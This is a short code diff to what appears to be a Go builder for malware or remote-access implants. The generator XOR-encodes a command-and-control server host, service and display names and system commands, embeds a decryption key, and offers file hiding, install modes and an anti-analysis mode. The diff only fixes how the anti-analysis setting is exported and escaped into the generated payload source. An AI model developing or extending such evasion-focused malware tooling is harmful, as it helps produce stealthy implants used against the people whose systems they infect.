@@ -121,6 +121,7 @@ type globalValues struct {
 	EncSysctlCmd        string
 	EncSysctlNameArg    string
 	EncXdgOpen          string
+	AntiAnalysisMode    string
 	XorKeyLiteral       string
 }
 
@@ -254,7 +255,7 @@ func buildGlobals(cfg Config) (globalValues, error) {
 		EncSysctlCmd:      xorWithKey("sysctl", key),
 		EncSysctlNameArg:  xorWithKey("-n", key),
 		EncXdgOpen:        xorWithKey("xdg-open", key),
-		antiAnalysisMode:  strings.TrimSpace(cfg.AntiAnalysis),
+		AntiAnalysisMode:  strings.TrimSpace(cfg.AntiAnalysis),
 		XorKeyLiteral:     escapeGoString(key),
 	}, nil
 }
@@ -397,7 +398,8 @@ var decryptionKey = []byte("%s")
 		goHideFiles,
 		escapeGoString(g.InstallMode),
 		g.CustomInstallPath,
-		g.antiAnalysisMode,
+		escapeGoString(g.AntiAnalysisMode),
+
 		g.EncServerHost,
 		g.EncServiceName,
 		g.EncDisplayName,
